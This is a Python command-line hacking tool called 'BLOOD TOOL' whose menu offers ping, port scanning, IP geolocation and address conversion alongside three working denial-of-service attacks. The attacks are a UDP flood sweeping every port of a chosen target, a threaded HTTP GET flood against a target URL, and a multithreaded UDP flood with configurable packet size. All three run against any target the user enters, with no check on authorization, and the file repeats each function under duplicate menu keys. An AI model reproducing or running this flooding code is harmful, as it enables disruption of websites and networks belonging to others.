
import socket
import os
import random
import time
import threading
from time import sleep
from os import system
import requests
import nmap
import ipaddress
import platform
import sys


B = '\033[35m'
R = '\033[31m'
N = '\033[0m'
A = '\033[34m'

def get_ip_address(domain):
    try:
        ip_address = socket.gethostbyname(domain)
        return ip_address
    except socket.gaierror:
        return None
      
def get_ipv4_address():
    try:
        hostname = socket.gethostname()
        ipv4_address = socket.gethostbyname(hostname)
        return ipv4_address
    except:
        return "Not found"

def get_ipv6_address():
    try:
        ipv6_address = requests.get('https://api6.ipify.org').text
        return ipv6_address
    except:
        return "Not found"

def get_public_ip():
    try:
        public_ip = requests.get('https://api.ipify.org').text
        return public_ip
    except:
        return "Not found"
    

if platform.system() == "Windows":
    os.system("cls")
else:
    os.system("clear")

def main():
    white = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(3500)
    if platform.system() == "Windows":
        os.system("cls")
    else:
        os.system("clear")

    
    print(" ")
    print(f"""{R}
                  ██████╗ ██╗      ██████╗  ██████╗ ██████╗     ████████╗ ██████╗  ██████╗ ██╗     
                  ██╔══██╗██║     ██╔═══██╗██╔═══██╗██╔══██╗    ╚══██╔══╝██╔═══██╗██╔═══██╗██║     
                  ██████╔╝██║     ██║   ██║██║   ██║██║  ██║       ██║   ██║   ██║██║   ██║██║     
                  ██╔══██╗██║     ██║   ██║██║   ██║██║  ██║       ██║   ██║   ██║██║   ██║██║     
                  ██████╔╝███████╗╚██████╔╝╚██████╔╝██████╔╝       ██║   ╚██████╔╝╚██████╔╝███████╗
                  ╚═════╝ ╚══════╝ ╚═════╝  ╚═════╝ ╚═════╝        ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝

╔══╦════════════════════════╦══╦════════════════════════╦══╦════════════════════════╦══╦════════════════════════╗
║01║ Ping an IP             ║04║ DDoS a Site or IP (V3) ║07║ Find host IP of a Site ║10║ IPv6 to IPv4           ║
║02║ DDos a Site or IP (V1) ║05║ IP Address Lookup      ║08║ Full Port Scanner      ║11║ IPv4 to IPv6           ║
║03║ DDoS a Site (V2)       ║06║ Get your IP Address    ║09║ Common Ports Scanner   ║12║ Exit                   ║
╚══╩════════════════════════╩══╩════════════════════════╩══╩════════════════════════╩══╩════════════════════════╝""")
    print()

    Choice = input(R + "[" + B + "#" + R + "] " + R + "Enter your choice : " + B)

    if Choice == "1":
        def check_internet():
            try:
                socket.create_connection(("www.google.com", 80))
                return True
            except OSError:
                return False
            
        ipA = input(R + "[" + B + "+" + R + "] " + R + "Target's IP : " + B)
        print(B + B + "[" + A + "$" + B + "] " + B + "Pinging...")
        sleep(2)

        if not check_internet():
                print(R + "[" + B + "!" + R + "] " + R + "Please check your internet connection")
                sleep(3)
                main()
        lpingip = f"ping -w 1000 {ipA}"
        pingip = "ping -t -w 1000 " + "" + ipA
        if platform.system() == "Windows":
            os.system("cls")
            print(R)
            system(pingip)
        else:
            os.system("clear")
            print(R)
            system(lpingip)
        sleep(100)
        




    elif Choice == "2":
        ip = input(R + "[" + B + "+" + R + "] " + R + "Target's IP or Website Domain : " + B)
        print(B + B + "[" + A + "$" + B + "] " + B + "Attack starting...")
        time.sleep(3)
        sent = 0

        while True: 
            for port in range(1, 65534):
                try:
                    white.sendto(bytes, (ip, port))
                    sent = sent + 1
                    print("\033[1;35mSend \033[1;31m%s \033[1;35m Packets to \033[1;31m%s \033[1;35mThrough port \033[1;31m%s " % (sent, ip, port))
                except socket.gaierror:
                    print(R + R + "[" + B + "!" + R + "] " + R + "can not find the ip address")
                    time.sleep(3)
                    if platform.system() == "Windows":
                        os.system("cls")
                    else:
                        os.system("clear")
                    main()
                    return
                
    

    elif Choice == "3":
        def check_internet():
            try:
                socket.create_connection(("www.google.com", 80))
                return True
            except OSError:
                return False
            
        def dos(target):
            while True:
                try:
                    res = requests.get(target)
                    print("Request sent")
                except requests.exceptions.ConnectionError:
                    print(R + R + "[" + B + "!" + R + "] " + R + "Connection error")
 
        threads = 20

        

        url = input(R + "[" + B + "+" + R + "] " + "Target's Website URL : " + B)

        
        
        if not check_internet():
                print(R + "[" + B + "!" + R + "] " + R + "Please check your internet connection")
                sleep(3)
                main()

        
        
 
        try:
            threads = int(input(R + "[" + B + "+" + R + "] " + "Threads : " + B))
            print(B + B + "[" + A + "$" + B + "] " + B + "Attack starting...")
            sleep(4)
        except ValueError:
            print(R + "[" + B + "!" + R + "] " + "Threads count is incorrect")
            time.sleep(3)
            main()
 
        if threads == 0:
            print(R + "[" + B + "!" + R + "] " + "Threads count is incorrect")
            time.sleep(3)
            main()
            
        if not url.__contains__("http"):
            print(R + "[" + B + "!" + R + "] " + "URL doesnt contains http or https")
            sleep(3)
            main()

        if not url.__contains__("."):
            print(R + "[" + B + "!" + R + "] " + "Invalid domain")
            sleep(3)
            main()
 
        for i in range(0, threads):
            thr = threading.Thread(target=dos, args=(url,))
            thr.start()
            print(B + B + "[" + A + "$" + B + "] " + B +  str(i + 1) + " threads started")
    
    elif Choice == "4":


            

        def DoS(ip, port, size, index):
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            while True:
                sock.sendto(random._urandom(size), (ip, port))
                print(f"{R}[{B}THREAD {index}{R}] {R}\xBB {B}{size} {R}bytes sent to {B}{ip}\033[0m")

        def mainv4():
            
            
                
            IP       = input(R + "[" + B + "+" + R + "] " + R + "Target's IP or Website Domain : " + B) if len(sys.argv) < 2 else sys.argv[1]
            PORT     = int(input(R + "[" + B + "+" + R + "] " + R + "Target's Port : " + B)) if len(sys.argv) < 3 else int(sys.argv[2])
            SIZE     = int(input(R + "[" + B + "+" + R + "] " + R + "Packet Size : " + B)) if len(sys.argv) < 4 else int(sys.argv[3])
            COUNT    = int(input(R + "[" + B + "+" + R + "] " + R + "Enter How Many Threads to Use : " + B)) if len(sys.argv) < 5 else int(sys.argv[4])


            if PORT > 65535 or PORT < 1:
                print(f"\n{R}[{B}!{R}]{R} {R}\xBB Please choose a port between 1 and 65535")
                time.sleep(3)
                main()

            if SIZE > 65500 or SIZE < 1:
                print(f"\n{R}[{B}!{R}]{R} {R}\xBB Please choose a packet size between 1 and 65500")
                time.sleep(3)
                main()

            for i in range(COUNT):
                try:
                    t = threading.Thread(target=DoS, args=(IP, PORT, SIZE, i))
                    t.start()
                except Exception as e:
                    print(f"\n{R}[{B}!{R}]{R} {R}\xBB An error ocurred initializing thread {i}: {e}")            

        if __name__ == "__main__":
            mainv4()



    elif Choice == "5":
        def check_internet():
            try:
                socket.create_connection(("www.google.com", 80))
                return True
            except OSError:
                return False

        def get_ip_info():
            ip_address = input(R + "[" + B + "+" + R + "] " + R + "Enter the IP address : " + B)
            print(B + B + "[" + A + "$" + B + "] " + B + "Getting some info...")
            sleep(2)

            if not check_internet():
                print(R + "[" + B + "!" + R + "] " + R + "Please check your internet connection")
                sleep(3)
                main()

            response = requests.get(f"http://ip-api.com/json/{ip_address}")

            if response.status_code != 200:
                print(R + "[" + B + "!" + R + "] " + R + "Cannot find the ip address")
                sleep(3)
                main()

            data = response.json()

            print(B + "\n╭ " + R + "IP ADDRESS : " + ip_address)
            print(B + "├ " + R + "STATE : ", data.get('regionName', 'N/A'))
            print(B + "├ " + R + "ORGANIZATION : ", data.get('org', 'N/A'))
            print(B + "├ " + R + "ISP : ", data.get('isp', 'N/A'))
            print(B + "├ " + R + "CITY : ", data.get('city', 'N/A'))
            print(B + "├ " + R + "COUNTRY : ", data.get('country', 'N/A'))
            print(B + "├ " + R + "COUNTRY ISO : ", data.get('countryCode', 'N/A'))
            print(B + "├ " + R + "POSTAL CODE : ", data.get('zip', 'N/A'))
            print(B + "├ " + R + "LATITUDE : ", data.get('lat', 'N/A'))
            print(B + "├ " + R + "LONGITUDE : ", data.get('lon', 'N/A'))

            if 'lat' in data and 'lon' in data:
                print(B + "╰ " + R + "LOCATION : ", f"https://www.google.com/maps/?q={data['lat']},{data['lon']}")
                
            main_menu = input(R + "\nWanna go back to the main menu (Y/N) ? ")

            if main_menu == "Y":
                print(B + B + "[" + A + "$" + B + "] " + B + "Transferring to the main menu...")
                sleep(2)
                main()

            elif main_menu == "N":
                sleep(2)
                exit()

            elif main_menu == "y":
                print(B + B + "[" + A + "$" + B + "] " + B + "Transferring to the main menu...")
                sleep(2)
                main()

            elif main_menu == "n":
                sleep(2)
                exit()
            
            else :
                sleep(2)
                exit()

        get_ip_info()


    elif Choice == "6":
        print()
        print(B + "╭ " + R + "IPv4 Address : ", get_ipv4_address())
        print(B + "├ " + R + "IPv6 Address : ", get_ipv6_address())
        print(B + "╰ " + R + "Public IP Address : ", get_public_ip())   

        main69 = input(R + "\nWanna go back to the main menu (Y/N) ? ")

        if main69 == "Y":
            print(B + B + "[" + A + "$" + B + "] " + B + "Transferring to the main menu...")
            sleep(2)
            main()

        elif main69 == "N":
            sleep(2)
            exit()

        elif main69 == "y":
            print(B + B + "[" + A + "$" + B + "] " + B + "Transferring to the main menu...")
            sleep(2)
            main()

        elif main69 == "n":
            sleep(2)
            exit()
            
        else :
            sleep(2)
            exit()

         
    elif Choice == "7":
        def check_internet():
            try:
                socket.create_connection(("www.google.com", 80))
                return True
            except OSError:
                return False
        
        def get_ip_address(domain):
            try:
                ip_address = socket.gethostbyname(domain)
                return ip_address
            except socket.gaierror:
                return None


        domain = input(R + "[" + B + "+" + R + "] " + "Enter the site Domain : " + B)
        print(B + "[" + A + "$" + B + "] " + "Finding the IP address...")
        sleep(2)

        if not check_internet():
                print(R + "[" + B + "!" + R + "] " + R + "Please check your internet connection")
                sleep(3)
                main()
        ip = get_ip_address(domain)

        if ip:
            print()
            print(B + "╭ " + R + "Site Domain : " + B +  domain)
            print(B + "|")
            print(B + "╰ " + R + f"The IP address of " + B + domain + R + " is " + B + ip)

            main_menu3 = input(R + "\nWanna go back to the main menu (Y/N) ? ")

            if main_menu3 == "Y":
                print(B + B + "[" + A + "$" + B + "] " + B + "Transferring to the main menu...")
                sleep(2)
                main()

            elif main_menu3 == "N":
                sleep(2)
                exit()

            elif main_menu3 == "y":
                print(B + B + "[" + A + "$" + B + "] " + B + "Transferring to the main menu...")
                sleep(2)
                main()

            elif main_menu3 == "n":
                sleep(2)
                exit()
            
            else :
                sleep(2)
                exit()

        else:
            print(R + "[" + B + "!" + R + "] " + R + f"Could not resolve the IP address of {domain}")
            sleep(4)
            main()



    elif Choice == "8":
        def is_valid_ip(ip_address):
            try:
                ipaddress.IPv4Address(ip_address)
                return True
            except ipaddress.AddressValueError:
                return False

        def scan_ports(ip_address):
            if not is_valid_ip(ip_address):
                print(f"{R}[{B}!{R}] Invalid IP address.")
                return

            nm = nmap.PortScanner()
            scan_result = nm.scan(ip_address, arguments='-F') 

            open_ports = []
            closed_ports = []
            filtered_ports = []

            if 'scan' in scan_result and ip_address in scan_result['scan']:
                for target_port in scan_result['scan'][ip_address]['tcp']:
                    state = scan_result['scan'][ip_address]['tcp'][target_port]['state']
                    if state == 'open':
                        open_ports.append(target_port)
                    elif state == 'closed':
                        closed_ports.append(target_port)
                    elif state == 'filtered':
                        filtered_ports.append(target_port)

            if open_ports:
                print(f"\n{R}[{B}?{R}] Open ports : " + ', '.join(str(port) for port in open_ports))
            else:
                print(f"\n{R}[{B}?{R}] No open ports found.")

            if closed_ports:
                print(f"{R}[{B}?{R}] Closed ports : {', '.join(str(port) for port in closed_ports)}")
            else:
                print(f"{R}[{B}?{R}] No closed ports found.")

            if filtered_ports:
                print(f"{R}[{B}?{R}] Filtered ports : {', '.join(str(port) for port in filtered_ports)}")
            else:
                print(f"{R}[{B}?{R}] No filtered ports found.")

        if __name__ == "__main__":
            target_ip = input(R + "[" + B + "+" + R + "] Enter The Device IP : " + B)  
            scan_ports(target_ip)

        main_menu2 = input(R + "\nWanna go back to the main menu (Y/N) ? ")

        if main_menu2 == "Y":
            print(B + B + "[" + A + "$" + B + "] " + B + "Transferring to the main menu...")
            sleep(2)
            main()

        elif main_menu2 == "N":
            sleep(2)
            exit()

        elif main_menu2 == "y":
            print(B + B + "[" + A + "$" + B + "] " + B + "Transferring to the main menu...")
            sleep(2)
            main()

        elif main_menu2 == "n":
            sleep(2)
            exit()
            
        else :
            sleep(2)
            exit()
    
    elif Choice=="9":
        def is_valid_ip(ip_address):
            try:
                socket.inet_aton(ip_address)
                return True
            except socket.error:
                return False

        def scan_ports(ip_address, ports):
            if not is_valid_ip(ip_address):
                print("Invalid IP address.")
                return

            open_ports = []
            closed_ports = []
            filtered_ports = []

            for port in ports:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1)  

                try:
                    result = s.connect_ex((ip_address, port))
                    if result == 0:
                        open_ports.append(port)
                    else:
                        if result == 111:
                            filtered_ports.append(port)
                        else:
                            closed_ports.append(port)
                except socket.error:
                    closed_ports.append(port)

                s.close()

            if open_ports:
                print()
                print(f"{R}[{B}?{R}] Open ports : {', '.join(str(port) for port in open_ports)}")
            else:
                print()
                print(f"{R}[{B}?{R}] No open ports found.")

            if closed_ports:
                print(f"{R}[{B}?{R}] Closed ports : {', '.join(str(port) for port in closed_ports)}")
            else:
                print(f"{R}[{B}?{R}] No closed ports found.")
            
            if filtered_ports:
                print(f"{R}[{B}?{R}] Filtered ports : {', '.join(str(port) for port in filtered_ports)}")
            else:
                print(f"{R}[{B}?{R}] No filtered ports found.")

        if __name__ == "__main__":
            target_ip = input(R + "[" + B + "+" + R + "] Enter The Device IP : " + B)
            def get_ip_address(domain):
                try:
                    ip_address = socket.gethostbyname(domain)
                    return ip_address
                except socket.gaierror:
                    return None
            target_ports = [21, 22, 23, 25, 53, 80, 110, 115, 135, 139, 143, 194, 443, 445, 1433, 3306, 3389, 5632, 5900, 25565]  
            scan_ports(target_ip, target_ports)

        main_menu2 = input(R + "\nWanna go back to the main menu (Y/N) ? ")

        if main_menu2 == "Y":
            print(B + B + "[" + A + "$" + B + "] " + B + "Transferring to the main menu...")
            sleep(2)
            main()

        elif main_menu2 == "N":
            sleep(2)
            exit()

        elif main_menu2 == "y":
            print(B + B + "[" + A + "$" + B + "] " + B + "Transferring to the main menu...")
            sleep(2)
            main()

        elif main_menu2 == "n":
            sleep(2)
            exit()
            
        else :
            sleep(2)
            exit()

    elif Choice=="10":
        def ipv6_to_ipv4(ipv6_address):
            try:
                ipv4_mapped = ipaddress.IPv6Address(ipv6_address).ipv4_mapped
                if ipv4_mapped:
                    return str(ipv4_mapped)
                else:
                    return "The entered IPv6 address is valid but cannot be converted to an IPv4 address."
            except ipaddress.AddressValueError:
                return "The entered IPv6 address is invalid."

        if __name__ == "__main__":
            ipv6_address = input(f"{R}[{B}+{R}] Enter the IPv6 address: {B}")
            ipv4_address = ipv6_to_ipv4(ipv6_address)
    
            if ipv4_address == "The entered IPv6 address is invalid.":
                print(f"\n{R}[{B}!{R}] The entered IPv6 address is invalid.")
            elif ipv4_address == "The entered IPv6 address is valid but cannot be converted to an IPv4 address.":
                print(f"\n{R}[{B}!{R}] The entered IPv6 address is valid but cannot be converted to an IPv4 address.")
            else:
                print(f"\n{R}[{B}?{R}] The IPv4 Address Of {B}{ipv6_address} {R}Is {B}{ipv4_address}")

            main_menu2 = input(R + "\nWanna go back to the main menu (Y/N) ? ")

            if main_menu2 == "Y":
                print(B + B + "[" + A + "$" + B + "] " + B + "Transferring to the main menu...")
                sleep(2)
                main()

            elif main_menu2 == "N":
                sleep(2)
                exit()

            elif main_menu2 == "y":
                print(B + B + "[" + A + "$" + B + "] " + B + "Transferring to the main menu...")
                sleep(2)
                main()

            elif main_menu2 == "n":
                sleep(2)
                exit()
            
            else :
                sleep(2)
                exit()

    
    elif Choice == "11":
        def ipv4_to_ipv6(ipv4_address):
            try:
                # Convert the IPv4 address to an IPv6 address with the IPv4-mapped prefix
                ipv6_address = ipaddress.IPv6Address(f"::ffff:{ipv4_address}")
                return str(ipv6_address)
            except ipaddress.AddressValueError:
                return None

        if __name__ == "__main__":
            ipv4_address = input(f"{R}[{B}+{R}] Enter the IPv4 address: {B}")
            ipv6_address = ipv4_to_ipv6(ipv4_address)
    
            if ipv6_address:
                print(f"\n{R}[{B}?{R}] The IPv6 Address Of {B}{ipv4_address}{R} Is {B}{ipv6_address}")
            else:
                print(f"\n{R}[{B}!{R}] The entered IPv4 address is invalid.")

            main_menu2 = input(R + "\nWanna go back to the main menu (Y/N) ? ")

            if main_menu2 == "Y":
                print(B + B + "[" + A + "$" + B + "] " + B + "Transferring to the main menu...")
                sleep(2)
                main()

            elif main_menu2 == "N":
                sleep(2)
                exit()

            elif main_menu2 == "y":
                print(B + B + "[" + A + "$" + B + "] " + B + "Transferring to the main menu...")
                sleep(2)
                main()

            elif main_menu2 == "n":
                sleep(2)
                exit()
            
            else :
                sleep(2)
                exit()

    elif Choice == "12":
        print(B + B + "[" + A + "$" + B + "] " + B + "Exiting...")
        time.sleep(2)
        exit()

    elif Choice == "01":
            def check_internet():
                try:
                    socket.create_connection(("www.google.com", 80))
                    return True
                except OSError:
                    return False
            
            ipA = input(R + "[" + B + "+" + R + "] " + R + "Target's IP : " + B)
            print(B + B + "[" + A + "$" + B + "] " + B + "Pinging...")
            sleep(2)

            if not check_internet():
                    print(R + "[" + B + "!" + R + "] " + R + "Please check your internet connection")
                    sleep(3)
                    main()

            pingip = "ping -t -w 1000 " + "" + ipA
            if platform.system() == "Windows":
                os.system("cls")
            else:
                os.system("clear")
            print(R)
            system(pingip)
            sleep(100)
        




    elif Choice == "02":
        ip = input(R + "[" + B + "+" + R + "] " + R + "Target's IP or Website Domain : " + B)
        print(B + B + "[" + A + "$" + B + "] " + B + "Attack starting...")
        time.sleep(3)
        sent = 0

        while True: 
            for port in range(1, 65534):
                try:
                    white.sendto(bytes, (ip, port))
                    sent = sent + 1
                    print("\033[1;35mSend \033[1;31m%s \033[1;35m Packets to \033[1;31m%s \033[1;35mThrough port \033[1;31m%s " % (sent, ip, port))
                except socket.gaierror:
                    print(R + R + "[" + B + "!" + R + "] " + R + "can not find the ip address")
                    time.sleep(3)
                    if platform.system() == "Windows":
                        os.system("cls")
                    else:
                        os.system("clear")
                    main()
                    return
                
    

    elif Choice == "03":
        def check_internet():
            try:
                socket.create_connection(("www.google.com", 80))
                return True
            except OSError:
                return False
            
        def dos(target):
            while True:
                try:
                    res = requests.get(target)
                    print("Request sent")
                except requests.exceptions.ConnectionError:
                    print(R + R + "[" + B + "!" + R + "] " + R + "Connection error")
 
        threads = 20

        

        url = input(R + "[" + B + "+" + R + "] " + "Target's Website URL : " + B)

        
        
        if not check_internet():
                print(R + "[" + B + "!" + R + "] " + R + "Please check your internet connection")
                sleep(3)
                main()

        
        
 
        try:
            threads = int(input(R + "[" + B + "+" + R + "] " + "Threads : " + B))
            print(B + B + "[" + A + "$" + B + "] " + B + "Attack starting...")
            sleep(4)
        except ValueError:
            print(R + "[" + B + "!" + R + "] " + "Threads count is incorrect")
            time.sleep(3)
            main()
 
        if threads == 0:
            print(R + "[" + B + "!" + R + "] " + "Threads count is incorrect")
            time.sleep(3)
            main()
            
        if not url.__contains__("http"):
            print(R + "[" + B + "!" + R + "] " + "URL doesnt contains http or https")
            sleep(3)
            main()

        if not url.__contains__("."):
            print(R + "[" + B + "!" + R + "] " + "Invalid domain")
            sleep(3)
            main()
 
        for i in range(0, threads):
            thr = threading.Thread(target=dos, args=(url,))
            thr.start()
            print(B + B + "[" + A + "$" + B + "] " + B +  str(i + 1) + " threads started")
    
    elif Choice == "04":


            

        def DoS(ip, port, size, index):
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            while True:
                sock.sendto(random._urandom(size), (ip, port))
                print(f"{R}[{B}THREAD {index}{R}] {R}\xBB {B}{size} {R}bytes sent to {B}{ip}\033[0m")

        def mainv4():
            
            
                
            IP       = input(R + "[" + B + "+" + R + "] " + R + "Target's IP or Website Domain : " + B) if len(sys.argv) < 2 else sys.argv[1]
            PORT     = int(input(R + "[" + B + "+" + R + "] " + R + "Target's Port : " + B)) if len(sys.argv) < 3 else int(sys.argv[2])
            SIZE     = int(input(R + "[" + B + "+" + R + "] " + R + "Packet Size : " + B)) if len(sys.argv) < 4 else int(sys.argv[3])
            COUNT    = int(input(R + "[" + B + "+" + R + "] " + R + "Enter How Many Threads to Use : " + B)) if len(sys.argv) < 5 else int(sys.argv[4])


            if PORT > 65535 or PORT < 1:
                print(f"\n{R}[{B}!{R}]{R} {R}\xBB Please choose a port between 1 and 65535")
                time.sleep(3)
                main()

            if SIZE > 65500 or SIZE < 1:
                print(f"\n{R}[{B}!{R}]{R} {R}\xBB Please choose a packet size between 1 and 65500")
                time.sleep(3)
                main()

            for i in range(COUNT):
                try:
                    t = threading.Thread(target=DoS, args=(IP, PORT, SIZE, i))
                    t.start()
                except Exception as e:
                    print(f"\n{R}[{B}!{R}]{R} {R}\xBB An error ocurred initializing thread {i}: {e}")            

        if __name__ == "__main__":
            mainv4()



    elif Choice == "05":
        def check_internet():
            try:
                socket.create_connection(("www.google.com", 80))
                return True
            except OSError:
                return False

        def get_ip_info():
            ip_address = input(R + "[" + B + "+" + R + "] " + R + "Enter the IP address : " + B)
            print(B + B + "[" + A + "$" + B + "] " + B + "Getting some info...")
            sleep(2)

            if not check_internet():
                print(R + "[" + B + "!" + R + "] " + R + "Please check your internet connection")
                sleep(3)
                main()

            response = requests.get(f"http://ip-api.com/json/{ip_address}")

            if response.status_code != 200:
                print(R + "[" + B + "!" + R + "] " + R + "Cannot find the ip address")
                sleep(3)
                main()

            data = response.json()

            print(B + "\n╭ " + R + "IP ADDRESS : " + ip_address)
            print(B + "├ " + R + "STATE : ", data.get('regionName', 'N/A'))
            print(B + "├ " + R + "ORGANIZATION : ", data.get('org', 'N/A'))
            print(B + "├ " + R + "ISP : ", data.get('isp', 'N/A'))
            print(B + "├ " + R + "CITY : ", data.get('city', 'N/A'))
            print(B + "├ " + R + "COUNTRY : ", data.get('country', 'N/A'))
            print(B + "├ " + R + "COUNTRY ISO : ", data.get('countryCode', 'N/A'))
            print(B + "├ " + R + "POSTAL CODE : ", data.get('zip', 'N/A'))
            print(B + "├ " + R + "LATITUDE : ", data.get('lat', 'N/A'))
            print(B + "├ " + R + "LONGITUDE : ", data.get('lon', 'N/A'))

            if 'lat' in data and 'lon' in data:
                print(B + "╰ " + R + "LOCATION : ", f"https://www.google.com/maps/?q={data['lat']},{data['lon']}")
                
            main_menu = input(R + "\nWanna go back to the main menu (Y/N) ? ")

            if main_menu == "Y":
                print(B + B + "[" + A + "$" + B + "] " + B + "Transferring to the main menu...")
                sleep(2)
                main()

            elif main_menu == "N":
                sleep(2)
                exit()

            elif main_menu == "y":
                print(B + B + "[" + A + "$" + B + "] " + B + "Transferring to the main menu...")
                sleep(2)
                main()

            elif main_menu == "n":
                sleep(2)
                exit()
            
            else :
                sleep(2)
                exit()

        get_ip_info()


    elif Choice == "06":
        print()
        print(B + "╭ " + R + "IPv4 Address : ", get_ipv4_address())
        print(B + "├ " + R + "IPv6 Address : ", get_ipv6_address())
        print(B + "╰ " + R + "Public IP Address : ", get_public_ip())   

        main69 = input(R + "\nWanna go back to the main menu (Y/N) ? ")

        if main69 == "Y":
            print(B + B + "[" + A + "$" + B + "] " + B + "Transferring to the main menu...")
            sleep(2)
            main()

        elif main69 == "N":
            sleep(2)
            exit()

        elif main69 == "y":
            print(B + B + "[" + A + "$" + B + "] " + B + "Transferring to the main menu...")
            sleep(2)
            main()

        elif main69 == "n":
            sleep(2)
            exit()
            
        else :
            sleep(2)
            exit()

         
    elif Choice == "07":
        def check_internet():
            try:
                socket.create_connection(("www.google.com", 80))
                return True
            except OSError:
                return False
        
        def get_ip_address(domain):
            try:
                ip_address = socket.gethostbyname(domain)
                return ip_address
            except socket.gaierror:
                return None


        domain = input(R + "[" + B + "+" + R + "] " + "Enter the site Domain : " + B)
        print(B + "[" + A + "$" + B + "] " + "Finding the IP address...")
        sleep(2)

        if not check_internet():
                print(R + "[" + B + "!" + R + "] " + R + "Please check your internet connection")
                sleep(3)
                main()
        ip = get_ip_address(domain)

        if ip:
            print()
            print(B + "╭ " + R + "Site Domain : " + B +  domain)
            print(B + "|")
            print(B + "╰ " + R + f"The IP address of " + B + domain + R + " is " + B + ip)

            main_menu3 = input(R + "\nWanna go back to the main menu (Y/N) ? ")

            if main_menu3 == "Y":
                print(B + B + "[" + A + "$" + B + "] " + B + "Transferring to the main menu...")
                sleep(2)
                main()

            elif main_menu3 == "N":
                sleep(2)
                exit()

            elif main_menu3 == "y":
                print(B + B + "[" + A + "$" + B + "] " + B + "Transferring to the main menu...")
                sleep(2)
                main()

            elif main_menu3 == "n":
                sleep(2)
                exit()
            
            else :
                sleep(2)
                exit()

        else:
            print(R + "[" + B + "!" + R + "] " + R + f"Could not resolve the IP address of {domain}")
            sleep(4)
            main()



    elif Choice == "08":
        def is_valid_ip(ip_address):
            try:
                ipaddress.IPv4Address(ip_address)
                return True
            except ipaddress.AddressValueError:
                return False

        def scan_ports(ip_address):
            if not is_valid_ip(ip_address):
                print(f"{R}[{B}!{R}] Invalid IP address.")
                return

            nm = nmap.PortScanner()
            scan_result = nm.scan(ip_address, arguments='-F') 

            open_ports = []
            closed_ports = []
            filtered_ports = []

            if 'scan' in scan_result and ip_address in scan_result['scan']:
                for target_port in scan_result['scan'][ip_address]['tcp']:
                    state = scan_result['scan'][ip_address]['tcp'][target_port]['state']
                    if state == 'open':
                        open_ports.append(target_port)
                    elif state == 'closed':
                        closed_ports.append(target_port)
                    elif state == 'filtered':
                        filtered_ports.append(target_port)

            if open_ports:
                print(f"\n{R}[{B}?{R}] Open ports : " + ', '.join(str(port) for port in open_ports))
            else:
                print(f"\n{R}[{B}?{R}] No open ports found.")

            if closed_ports:
                print(f"{R}[{B}?{R}] Closed ports : {', '.join(str(port) for port in closed_ports)}")
            else:
                print(f"{R}[{B}?{R}] No closed ports found.")

            if filtered_ports:
                print(f"{R}[{B}?{R}] Filtered ports : {', '.join(str(port) for port in filtered_ports)}")
            else:
                print(f"{R}[{B}?{R}] No filtered ports found.")

        if __name__ == "__main__":
            target_ip = input(R + "[" + B + "+" + R + "] Enter The Device IP : " + B)  
            scan_ports(target_ip)

        main_menu2 = input(R + "\nWanna go back to the main menu (Y/N) ? ")

        if main_menu2 == "Y":
            print(B + B + "[" + A + "$" + B + "] " + B + "Transferring to the main menu...")
            sleep(2)
            main()

        elif main_menu2 == "N":
            sleep(2)
            exit()

        elif main_menu2 == "y":
            print(B + B + "[" + A + "$" + B + "] " + B + "Transferring to the main menu...")
            sleep(2)
            main()

        elif main_menu2 == "n":
            sleep(2)
            exit()
            
        else :
            sleep(2)
            exit()
    
    elif Choice=="09":
        def is_valid_ip(ip_address):
            try:
                socket.inet_aton(ip_address)
                return True
            except socket.error:
                return False

        def scan_ports(ip_address, ports):
            if not is_valid_ip(ip_address):
                print("Invalid IP address.")
                return

            open_ports = []
            closed_ports = []
            filtered_ports = []

            for port in ports:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1)  

                try:
                    result = s.connect_ex((ip_address, port))
                    if result == 0:
                        open_ports.append(port)
                    else:
                        if result == 111:
                            filtered_ports.append(port)
                        else:
                            closed_ports.append(port)
                except socket.error:
                    closed_ports.append(port)

                s.close()

            if open_ports:
                print()
                print(f"{R}[{B}?{R}] Open ports : {', '.join(str(port) for port in open_ports)}")
            else:
                print()
                print(f"{R}[{B}?{R}] No open ports found.")

            if closed_ports:
                print(f"{R}[{B}?{R}] Closed ports : {', '.join(str(port) for port in closed_ports)}")
            else:
                print(f"{R}[{B}?{R}] No closed ports found.")
            
            if filtered_ports:
                print(f"{R}[{B}?{R}] Filtered ports : {', '.join(str(port) for port in filtered_ports)}")
            else:
                print(f"{R}[{B}?{R}] No filtered ports found.")

        if __name__ == "__main__":
            target_ip = input(R + "[" + B + "+" + R + "] Enter The Device IP : " + B)
            def get_ip_address(domain):
                try:
                    ip_address = socket.gethostbyname(domain)
                    return ip_address
                except socket.gaierror:
                    return None
            target_ports = [21, 22, 23, 25, 53, 80, 110, 115, 135, 139, 143, 194, 443, 445, 1433, 3306, 3389, 5632, 5900, 25565]  
            scan_ports(target_ip, target_ports)

        main_menu2 = input(R + "\nWanna go back to the main menu (Y/N) ? ")

        if main_menu2 == "Y":
            print(B + B + "[" + A + "$" + B + "] " + B + "Transferring to the main menu...")
            sleep(2)
            main()

        elif main_menu2 == "N":
            sleep(2)
            exit()

        elif main_menu2 == "y":
            print(B + B + "[" + A + "$" + B + "] " + B + "Transferring to the main menu...")
            sleep(2)
            main()

        elif main_menu2 == "n":
            sleep(2)
            exit()
            
        else :
            sleep(2)
            exit()


    else:
       print(R + "[" + B + "!" + R + "] " + R + "invailed choice")
       sleep(3)
       main()

if __name__ == "__main__":
    main()
